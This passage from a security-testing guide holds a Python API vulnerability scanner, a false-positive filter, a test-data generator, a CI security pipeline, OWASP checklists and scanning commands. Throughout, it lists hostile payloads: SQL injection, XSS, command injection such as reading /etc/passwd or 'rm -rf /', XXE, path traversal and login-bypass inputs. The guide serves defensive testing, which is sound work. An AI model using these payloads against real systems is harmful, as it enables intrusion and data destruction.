                        'endpoint': endpoint,
                        'payload': payload,
                        'description': 'SQL injection vulnerability in API parameter'
                    })

                # Test in POST data
                if endpoint.endswith('/'):
                    post_data = {'id': payload, 'search': payload}
                    response = requests.post(urljoin(self.base_url, endpoint),
                                           json=post_data, headers=headers)

                    if self._detect_sql_error(response.text):
                        self.vulnerabilities.append({
                            'type': 'SQL Injection (API POST)',
                            'severity': 'Critical',
                            'endpoint': endpoint,
                            'payload': payload,
                            'description': 'SQL injection vulnerability in API POST data'
                        })

    def test_mass_assignment(self, endpoint: str, auth_token: str = None):
        """Test for mass assignment vulnerabilities"""
        print(f"Testing mass assignment on {endpoint}...")

        headers = {'Content-Type': 'application/json'}
        if auth_token:
            headers['Authorization'] = f'Bearer {auth_token}'

        # Test with administrative fields
        test_payloads = [
            {'role': 'admin', 'is_admin': True, 'permissions': ['admin']},
            {'user_id': 1, 'account_id': 1, 'owner_id': 1},
            {'status': 'active', 'verified': True, 'approved': True},
            {'balance': 999999, 'credits': 999999, 'points': 999999}
        ]

        for payload in test_payloads:
            response = requests.post(urljoin(self.base_url, endpoint),
                                   json=payload, headers=headers)

            if response.status_code in [200, 201]:
                # Check if the response includes the assigned fields
                try:
                    response_data = response.json()
                    assigned_fields = []

                    for field, value in payload.items():
                        if field in response_data and response_data[field] == value:
                            assigned_fields.append(field)

                    if assigned_fields:
                        self.vulnerabilities.append({
                            'type': 'Mass Assignment',
                            'severity': 'High',
                            'endpoint': endpoint,
                            'description': f'Mass assignment vulnerability - assigned: {assigned_fields}',
                            'assigned_fields': assigned_fields
                        })

                except json.JSONDecodeError:
                    pass

    def _find_sensitive_field(self, data, field_name):
        """Recursively search for sensitive fields in API response"""
        if isinstance(data, dict):
            for key, value in data.items():
                if field_name.lower() in key.lower():
                    return True
                if isinstance(value, (dict, list)):
                    if self._find_sensitive_field(value, field_name):
                        return True
        elif isinstance(data, list):
            for item in data:
                if self._find_sensitive_field(item, field_name):
                    return True
        return False

    def _detect_sql_error(self, response_text):
        """Detect SQL error messages in API responses"""
        sql_errors = [
            'mysql_fetch_array',
            'ORA-[0-9]{5}',
            'PostgreSQL query failed',
            'Warning: pg_',
            'valid MySQL result',
            'MySqlException',
            'valid PostgreSQL result',
            'Warning: mysql_',
            'SQLServer JDBC Driver',
            'SqlException'
        ]

        response_lower = response_text.lower()
        for error in sql_errors:
            if error.lower() in response_lower:
                return True
        return False

    def generate_api_security_report(self):
        """Generate comprehensive API security report"""
        if not self.vulnerabilities:
            return "No API security vulnerabilities found."

        report = "API Security Test Report\n"
        report += "=" * 30 + "\n\n"

        # Group by severity
        severity_groups = {}
        for vuln in self.vulnerabilities:
            severity = vuln['severity']
            if severity not in severity_groups:
                severity_groups[severity] = []
            severity_groups[severity].append(vuln)

        for severity in ['Critical', 'High', 'Medium', 'Low']:
            if severity in severity_groups:
                report += f"{severity} Risk Vulnerabilities ({len(severity_groups[severity])})\n"
                report += "-" * 40 + "\n"

                for vuln in severity_groups[severity]:
                    report += f"Type: {vuln['type']}\n"
                    report += f"Endpoint: {vuln['endpoint']}\n"
                    report += f"Description: {vuln['description']}\n"

                    if 'payload' in vuln:
                        report += f"Payload: {vuln['payload']}\n"
                    if 'exposed_fields' in vuln:
                        report += f"Exposed Fields: {vuln['exposed_fields']}\n"

                    report += "\n"

        return report

# Usage example
if __name__ == "__main__":
    # Initialize API security tester
    api_tester = APISecurityTester("https://api.example.com")

    # Test endpoints
    endpoints = ["/api/users", "/api/orders", "/api/products"]
    protected_endpoints = ["/api/admin", "/api/user/profile"]

    # Run security tests
    api_tester.test_broken_authentication(protected_endpoints)
    api_tester.test_excessive_data_exposure(endpoints, "valid_token_here")
    api_tester.test_rate_limiting("/api/search")
    api_tester.test_sql_injection_api(endpoints)
    api_tester.test_mass_assignment("/api/users", "valid_token_here")

    # Test broken authorization with multiple users
    user_endpoints = {
        "user1_token": ["/api/user/1/profile", "/api/user/1/orders"],
        "user2_token": ["/api/user/2/profile", "/api/user/2/orders"]
    }
    api_tester.test_broken_authorization(user_endpoints)

    # Generate report
    print(api_tester.generate_api_security_report())
```

## Tools and Technologies

### Security Testing Tools Ecosystem

#### Commercial Security Tools
| Tool | Category | Strengths | Best For | Cost |
|------|----------|-----------|----------|------|
| **Burp Suite Pro** | DAST | Comprehensive web testing | Manual security testing | $399/year |
| **Checkmarx** | SAST | Enterprise-grade | Large codebases | Enterprise |
| **Veracode** | SAST/DAST | Cloud-based platform | CI/CD integration | Enterprise |
| **Snyk** | SCA | Developer-friendly | Dependency scanning | Freemium |
| **Qualys WAS** | DAST | Scalable scanning | Web applications | Enterprise |

#### Open Source Security Tools
| Tool | Category | Features | Integration |
|------|----------|----------|-------------|
| **OWASP ZAP** | DAST | Automated + Manual | CI/CD friendly |
| **SonarQube** | SAST | Code quality + Security | IDE integration |
| **Bandit** | SAST | Python-specific | GitHub Actions |
| **Semgrep** | SAST | Multi-language | Fast scanning |
| **Dependency-Check** | SCA | OWASP project | Maven/Gradle |

## Common Challenges

### Security Testing Implementation Challenges

#### 1. False Positive Management
**Challenge**: High false positive rates in automated security scanning

**Solution Framework:**
```python
#!/usr/bin/env python3
"""
False Positive Management System
Reduces false positives in security scanning
"""

import json
import re
from typing import List, Dict

class FalsePositiveFilter:
    def __init__(self, rules_file: str = 'false_positive_rules.json'):
        self.rules_file = rules_file
        self.rules = self.load_rules()

    def load_rules(self) -> Dict:
        """Load false positive filtering rules"""
        try:
            with open(self.rules_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return {
                'global_filters': [],
                'vulnerability_specific': {},
                'file_path_filters': [],
                'url_filters': []
            }

    def is_false_positive(self, vulnerability: Dict) -> bool:
        """Determine if a vulnerability is a false positive"""

        # Check global filters
        for filter_rule in self.rules.get('global_filters', []):
            if self._matches_filter(vulnerability, filter_rule):
                return True

        # Check vulnerability-specific filters
        vuln_type = vulnerability.get('type', '').lower()
        specific_filters = self.rules.get('vulnerability_specific', {}).get(vuln_type, [])

        for filter_rule in specific_filters:
            if self._matches_filter(vulnerability, filter_rule):
                return True

        # Check file path filters
        file_path = vulnerability.get('file', '')
        for path_filter in self.rules.get('file_path_filters', []):
            if re.search(path_filter['pattern'], file_path):
                return True

        # Check URL filters
        url = vulnerability.get('url', '')
        for url_filter in self.rules.get('url_filters', []):
            if re.search(url_filter['pattern'], url):
                return True

        return False

    def _matches_filter(self, vulnerability: Dict, filter_rule: Dict) -> bool:
        """Check if vulnerability matches a filter rule"""
        for field, pattern in filter_rule.items():
            if field == 'confidence' and vulnerability.get('confidence', 0) < pattern:
                return True
            elif field == 'severity' and vulnerability.get('severity', '').lower() in pattern:
                return True
            elif field == 'description_pattern':
                if re.search(pattern, vulnerability.get('description', ''), re.IGNORECASE):
                    return True
        return False

    def filter_vulnerabilities(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """Filter out false positives from vulnerability list"""
        filtered = []
        false_positives = []

        for vuln in vulnerabilities:
            if self.is_false_positive(vuln):
                false_positives.append(vuln)
            else:
                filtered.append(vuln)

        print(f"Filtered {len(false_positives)} false positives from {len(vulnerabilities)} vulnerabilities")
        return filtered

    def add_false_positive_rule(self, vulnerability: Dict, rule_type: str = 'global'):
        """Add a new false positive rule based on a vulnerability"""
        new_rule = {
            'type': vulnerability.get('type'),
            'description_pattern': re.escape(vulnerability.get('description', '')[:50]),
            'confidence_threshold': vulnerability.get('confidence', 50)
        }

        if rule_type == 'global':
            self.rules['global_filters'].append(new_rule)
        else:
            vuln_type = vulnerability.get('type', '').lower()
            if vuln_type not in self.rules['vulnerability_specific']:
                self.rules['vulnerability_specific'][vuln_type] = []
            self.rules['vulnerability_specific'][vuln_type].append(new_rule)

        self.save_rules()

    def save_rules(self):
        """Save false positive rules to file"""
        with open(self.rules_file, 'w') as f:
            json.dump(self.rules, f, indent=2)

# Example usage
if __name__ == "__main__":
    fp_filter = FalsePositiveFilter()

    # Sample vulnerabilities
    vulnerabilities = [
        {
            'type': 'SQL Injection',
            'description': 'Potential SQL injection in test environment',
            'file': '/tests/security_test.py',
            'confidence': 30,
            'severity': 'High'
        },
        {
            'type': 'XSS',
            'description': 'Cross-site scripting vulnerability',
            'url': '/api/production/users',
            'confidence': 90,
            'severity': 'High'
        }
    ]

    filtered = fp_filter.filter_vulnerabilities(vulnerabilities)
    print(f"Remaining vulnerabilities: {len(filtered)}")
```

#### 2. Security Test Data Management
**Challenge**: Creating realistic test data while maintaining security

**Solution:**
```python
#!/usr/bin/env python3
"""
Secure Test Data Generator
Generates realistic but secure test data for security testing
"""

import random
import string
import hashlib
from faker import Faker
from datetime import datetime, timedelta

class SecureTestDataGenerator:
    def __init__(self):
        self.fake = Faker()
        self.fake.seed_instance(42)  # Reproducible test data

    def generate_user_data(self, count: int = 100) -> list:
        """Generate secure test user data"""
        users = []

        for i in range(count):
            user = {
                'id': i + 1,
                'username': self.fake.user_name() + str(random.randint(100, 999)),
                'email': self.fake.email(),
                'first_name': self.fake.first_name(),
                'last_name': self.fake.last_name(),
                'password_hash': self._generate_secure_hash(f"password{i}"),
                'created_at': self.fake.date_time_between(start_date='-2y', end_date='now'),
                'is_active': random.choice([True, False]),
                'role': random.choice(['user', 'moderator', 'admin']),
                'phone': self.fake.phone_number(),
                'address': {
                    'street': self.fake.street_address(),
                    'city': self.fake.city(),
                    'postal_code': self.fake.postcode(),
                    'country': self.fake.country()
                }
            }
            users.append(user)

        return users

    def generate_vulnerable_payloads(self) -> dict:
        """Generate payloads for security testing"""
        return {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT username, password FROM users --"
            ],
            'xss': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")'
            ],
            'command_injection': [
                '; cat /etc/passwd',
                '| ls -la',
                '&& whoami'
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd'
            ]
        }

    def generate_api_test_data(self) -> dict:
        """Generate API-specific test data"""
        return {
            'valid_request': {
                'user_id': random.randint(1, 1000),
                'action': 'read',
                'resource': 'profile',
                'timestamp': datetime.now().isoformat()
            },
            'boundary_values': {
                'max_integer': 2147483647,
                'min_integer': -2147483648,
                'empty_string': '',
                'long_string': 'A' * 10000,
                'null_value': None,
                'boolean_true': True,
                'boolean_false': False
            },
            'malicious_inputs': {
                'script_injection': '<script>alert(1)</script>',
                'sql_injection': "'; DROP TABLE users; --",
                'command_injection': '; rm -rf /',
                'xxe_injection': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            }
        }

    def _generate_secure_hash(self, password: str) -> str:
        """Generate secure password hash"""
        salt = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        return hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000).hex()

    def generate_jwt_test_tokens(self) -> dict:
        """Generate JWT tokens for testing"""
        import jwt

        secret = "test_secret_key_not_for_production"

        # Valid token
        valid_payload = {
            'user_id': 123,
            'username': 'testuser',
            'role': 'user',
            'exp': int((datetime.now() + timedelta(hours=1)).timestamp())
        }
        valid_token = jwt.encode(valid_payload, secret, algorithm='HS256')

        # Expired token
        expired_payload = {
            'user_id': 123,
            'username': 'testuser',
            'role': 'user',
            'exp': int((datetime.now() - timedelta(hours=1)).timestamp())
        }
        expired_token = jwt.encode(expired_payload, secret, algorithm='HS256')

        # Admin token
        admin_payload = {
            'user_id': 1,
            'username': 'admin',
            'role': 'admin',
            'exp': int((datetime.now() + timedelta(hours=1)).timestamp())
        }
        admin_token = jwt.encode(admin_payload, secret, algorithm='HS256')

        return {
            'valid_token': valid_token,
            'expired_token': expired_token,
            'admin_token': admin_token,
            'invalid_token': 'invalid.jwt.token',
            'malformed_token': 'not.a.jwt'
        }

# Usage example
if __name__ == "__main__":
    generator = SecureTestDataGenerator()

    # Generate test users
    test_users = generator.generate_user_data(10)
    print(f"Generated {len(test_users)} test users")

    # Generate test payloads
    payloads = generator.generate_vulnerable_payloads()
    print(f"Generated {sum(len(v) for v in payloads.values())} test payloads")

    # Generate JWT tokens
    tokens = generator.generate_jwt_test_tokens()
    print(f"Generated {len(tokens)} JWT test tokens")
```

## Metrics and Measurement

### Security Testing KPIs

#### Security Metrics Dashboard
```json
{
  "security_metrics": {
    "vulnerability_detection": {
      "critical_vulnerabilities": {
        "current": 0,
        "target": 0,
        "trend": "stable",
        "measurement": "Static and dynamic scanning"
      },
      "high_vulnerabilities": {
        "current": 2,
        "target": "< 5",
        "trend": "decreasing",
        "measurement": "Automated security scanning"
      },
      "mean_time_to_detection": {
        "current": "24 hours",
        "target": "< 48 hours",
        "trend": "improving",
        "measurement": "Security monitoring"
      },
      "mean_time_to_remediation": {
        "current": "5 days",
        "target": "< 7 days",
        "trend": "stable",
        "measurement": "Issue tracking"
      }
    },
    "security_testing_coverage": {
      "sast_coverage": {
        "current": "95%",
        "target": "> 90%",
        "measurement": "Code analysis coverage"
      },
      "dast_coverage": {
        "current": "80%",
        "target": "> 85%",
        "measurement": "Web application coverage"
      },
      "api_security_coverage": {
        "current": "75%",
        "target": "> 80%",
        "measurement": "API endpoint coverage"
      }
    },
    "security_gate_performance": {
      "pipeline_security_gate_pass_rate": {
        "current": "92%",
        "target": "> 90%",
        "measurement": "CI/CD pipeline metrics"
      },
      "false_positive_rate": {
        "current": "15%",
        "target": "< 20%",
        "measurement": "Security scan analysis"
      }
    }
  }
}
```

## Advanced Topics

### DevSecOps Integration Patterns

#### 1. Security-as-Code Implementation
```yaml
# .github/workflows/devsecops-pipeline.yml
name: DevSecOps Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  SECURITY_GATE_THRESHOLD: "HIGH"

jobs:
  security-linting:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2

    - name: Security Configuration Linting
      run: |
        # Lint Dockerfile for security best practices
        docker run --rm -i hadolint/hadolint < Dockerfile

        # Lint Kubernetes manifests
        kubectl apply --dry-run=client -f k8s/

        # Check for secrets in code
        truffleHog --regex --entropy=False .

  secret-scanning:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
      with:
        fetch-depth: 0

    - name: GitLeaks Secret Scan
      uses: zricethezav/gitleaks-action@master

    - name: Detect Secrets
      run: |
        pip install detect-secrets
        detect-secrets scan --all-files --baseline .secrets.baseline

  infrastructure-security:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2

    - name: Terraform Security Scan
      uses: bridgecrewio/checkov-action@master
      with:
        directory: ./terraform
        framework: terraform

    - name: CloudFormation Security Scan
      run: |
        cfn-lint cloudformation/*.yaml
        checkov -f cloudformation/

  compliance-check:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2

    - name: CIS Benchmark Check
      run: |
        # Run CIS benchmark checks
        docker run --rm -v $PWD:/src cis-docker-benchmark

    - name: PCI DSS Compliance Check
      run: |
        # Check PCI DSS compliance requirements
        ./scripts/pci-compliance-check.sh

  security-gate:
    needs: [security-linting, secret-scanning, infrastructure-security, compliance-check]
    runs-on: ubuntu-latest
    steps:
    - name: Evaluate Security Gate
      run: |
        echo "Evaluating security gate criteria..."
        # Aggregate security test results
        # Fail if critical security issues found
        if [ "$CRITICAL_ISSUES" -gt 0 ]; then
          echo "❌ Security gate failed: Critical issues found"
          exit 1
        fi
        echo "✅ Security gate passed"
```

## Quick Reference

### Security Testing Checklist

#### OWASP Top 10 Testing Checklist
- [ ] **A01: Broken Access Control**
  - [ ] Test horizontal privilege escalation
  - [ ] Test vertical privilege escalation
  - [ ] Verify direct object references
  - [ ] Test forced browsing

- [ ] **A02: Cryptographic Failures**
  - [ ] Test data in transit encryption
  - [ ] Test data at rest encryption
  - [ ] Verify cipher strength
  - [ ] Test certificate validation

- [ ] **A03: Injection**
  - [ ] SQL injection testing
  - [ ] NoSQL injection testing
  - [ ] Command injection testing
  - [ ] LDAP injection testing

- [ ] **A04: Insecure Design**
  - [ ] Review threat model
  - [ ] Test business logic flaws
  - [ ] Verify security controls
  - [ ] Test for missing security features

- [ ] **A05: Security Misconfiguration**
  - [ ] Test default configurations
  - [ ] Verify error handling
  - [ ] Test security headers
  - [ ] Check for information disclosure

#### API Security Testing Checklist
- [ ] **Authentication Testing**
  - [ ] Test broken authentication
  - [ ] Test session management
  - [ ] Test password policies
  - [ ] Test multi-factor authentication

- [ ] **Authorization Testing**
  - [ ] Test BOLA/IDOR vulnerabilities
  - [ ] Test function level authorization
  - [ ] Test mass assignment
  - [ ] Test privilege escalation

- [ ] **Input Validation**
  - [ ] Test injection vulnerabilities
  - [ ] Test input sanitization
  - [ ] Test file upload security
  - [ ] Test API parameter pollution

### Security Testing Commands

```bash
# OWASP ZAP CLI Commands
zap-cli start --start-options '-config api.disablekey=true'
zap-cli spider http://example.com
zap-cli active-scan http://example.com
zap-cli report -o zap-report.html -f html

# Nmap Security Scanning
nmap -sV --script vuln target.com
nmap -sS -O target.com
nmap --script ssl-enum-ciphers -p 443 target.com

# SSL/TLS Testing
testssl.sh https://example.com
sslscan example.com:443

# Subdomain Enumeration
subfinder -d example.com
amass enum -d example.com

# Directory/File Discovery
dirb http://example.com
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# SQL Injection Testing
sqlmap -u "http://example.com/page?id=1" --dbs
sqlmap -u "http://example.com/page?id=1" --tables -D database_name
```

### Security Test Data Templates

```json
{
  "sql_injection_payloads": [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users; --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --"
  ],
  "xss_payloads": [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')"
  ],
  "command_injection_payloads": [
    "; cat /etc/passwd",
    "| whoami",
    "&& ls -la",
    "`id`"
  ],
  "authentication_bypass": [
    {"username": "admin'--", "password": "anything"},
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "admin", "password": "admin"},
    {"username": "", "password": ""}
  ]
}
```

---

**Next Steps:**
1. Implement automated security scanning in CI/CD pipelines
2. Establish security testing standards and baselines
3. Train development teams on secure coding practices
4. Create security incident response procedures
5. Regularly update security testing tools and techniques

This comprehensive guide provides the foundation for implementing robust security testing practices that protect applications from modern security threats while maintaining development velocity.